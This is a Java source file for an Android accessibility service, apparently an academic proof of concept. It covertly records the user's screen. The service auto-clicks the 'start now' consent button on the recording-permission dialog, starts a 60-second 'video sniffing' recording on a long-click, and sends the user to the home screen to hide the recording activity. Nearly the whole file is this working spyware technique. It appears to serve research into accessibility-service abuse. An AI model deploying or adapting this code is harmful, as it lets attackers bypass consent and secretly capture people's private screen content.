package de.fau.i1.aka.avt.Services;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

import de.fau.i1.aka.avt.ScreenRecord.ScreenRecordActivity;

import static android.view.accessibility.AccessibilityEvent.TYPE_VIEW_LONG_CLICKED;
import static android.view.accessibility.AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;

/**
 * Created by Anatoli Kalysch (anatoli.kalysch@fau.de), Department of Computer Science, Friedrich-Alexander University Erlangen-Nuremberg, on 10.11.17.
 */

public class AccessibilityServiceSM extends AccessibilityService {

    private static final String TAG = "AccServ";

    public static final boolean debug = true;

    // video sniffing
    private boolean video_sniff_started = false;
    private boolean use_video_sniffer = true;


    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.i(String.valueOf(event.getEventType()), event.getText().toString());
        AccessibilityNodeInfo source = event.getSource();

        if (source == null) {
            return;
        }

        // If available find a button with "start now" and click it - this instantly grants the
        // right to record videos to the accessibility service.
        findAndClickByText(source, "start now");

        // a long click is used as a start signal for the video here
        switch (event.getEventType()) {
            case TYPE_VIEW_LONG_CLICKED:
                if (use_video_sniffer) {
                    if (!video_sniff_started) {
                        video_sniff_started = true;
                        startScreenRecord();

                        Handler handler = new Handler();
                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                stopScreenRecord();
                            }
                        }, 60000); // kill video recording after 60 seconds, this is a PoC only
                    }
                }

                break;
        }
    }

    @Override
    public void onInterrupt() {}

    //Configure the Accessibility Service
    @Override
    public void onServiceConnected() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    /**
     * Starts the screen recording. After 5 seconds sends the user to the Home Screen.
     */
    public void startScreenRecord() {
        try{
            Intent intent = new Intent(this, ScreenRecordActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            this.startActivity(intent);

            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    Intent i = new Intent(Intent.ACTION_MAIN);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    i.addCategory(Intent.CATEGORY_HOME);
                    startActivity(i);
                }
            }, 5000);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void stopScreenRecord() {
        Intent intent = new Intent(ScreenRecordActivity.INTENTFILTER);
        sendBroadcast(intent);
        video_sniff_started = false;
    }

    boolean findAndClickByText(AccessibilityNodeInfo source, String searchString) {
        List<AccessibilityNodeInfo> button = source.findAccessibilityNodeInfosByText(searchString);
        if (button.size() > 0) {
            for (AccessibilityNodeInfo accessibilityNodeInfo : button) {
                performClick(accessibilityNodeInfo);
            }
            return true;
        }
        return false;
    }

    boolean performClick(AccessibilityNodeInfo button) {
        if (button.isClickable()) {
            button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            button.recycle();
            return true;
        } else {
            try {
                return performClick(button.getParent());
            } catch (NullPointerException ignored) {}
        }
        return false;
    }
}
